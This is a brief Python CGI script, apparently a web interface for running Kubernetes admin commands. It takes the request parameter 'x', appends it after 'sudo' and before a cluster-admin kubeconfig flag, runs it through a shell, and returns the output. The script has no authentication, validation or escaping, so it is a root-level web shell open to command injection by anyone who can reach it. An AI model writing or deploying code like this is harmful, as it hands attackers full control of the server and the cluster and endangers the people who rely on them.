import cgi
import subprocess as sp

print("content-type: text/html")
print()

f=cgi.FieldStorage()
cmd=f.getvalue("x")


o=sp.getoutput("sudo "+cmd + " --kubeconfig admin.conf")
print(o)
